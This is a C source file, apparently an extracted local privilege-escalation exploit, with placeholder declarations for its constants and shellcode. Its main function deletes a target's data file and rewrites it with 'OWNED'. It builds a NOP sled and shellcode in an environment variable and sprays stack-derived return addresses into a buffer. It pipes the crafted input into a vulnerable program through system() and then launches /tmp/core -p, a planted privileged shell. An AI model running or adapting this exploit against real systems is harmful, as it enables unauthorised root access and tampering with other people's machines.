#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int ALIGN ; 
 int /*<<< orphan*/  DAT ; 
 int DBUF ; 
 char NOP ; 
 int OFFSET ; 
 char* PATH ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  fclose (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fopen (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ *,char*,...) ; 
 int get_sp () ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  putenv (char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*,char*) ; 
 int /*<<< orphan*/ * stderr ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  system (char*) ; 
 int /*<<< orphan*/  unlink (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc, char **argv){ 
   char eipeip[DBUF], buffer[7192]; 
   char go[DBUF + 22]; 
   FILE *calls; 
   int i, offset, align; 
   long address;

   usage(argv[0]);

   /* Remove the config and write OWNED! */
   unlink(DAT);
   calls = fopen(DAT, "w");
   fprintf(calls, "OWNED\n");
   fclose(calls);

   /* Do command line */
   if (argc > 1) {
      offset = atoi(argv[1]);
   }
   else {
      offset = OFFSET;
   } 

   if (argc > 2) { 
      align = atoi(argv[2]);
   } 
   else { 
      align = ALIGN;
   } 

   address = get_sp() - offset;
 
   if (align > 0) {
      for(i=0; i < align; i++) {
	 eipeip[i] = 0x69;
      }
   }
 
   for (i=align; i < DBUF; i+=4) {
      *(long *)&eipeip[i] = address;
   } 
   for (i=0; i < (7192 - strlen(shellcode) - strlen(eipeip)); i++) {
      buffer[i] = NOP;
   }

   /* setup the environment */
   memcpy(buffer + i, shellcode, strlen(shellcode)); 
   memcpy(buffer, "UPEX=", 5);
   putenv(buffer);
   
   fprintf(stderr, "Ret-addr: %#x, offset: %d, align: %d.\n", address, \
	   offset, align); 

   sprintf(go, "(printf '1\n0\nC\n%s\n0\n')|%s", eipeip, PATH); //netcat style.
   system(go);

   fprintf(stderr, "Score: core wins!\n");
   
#ifdef SH_IS_BASH   
   system("/tmp/core -p");
#else
   system("/tmp/core");
#endif

   return 0;
}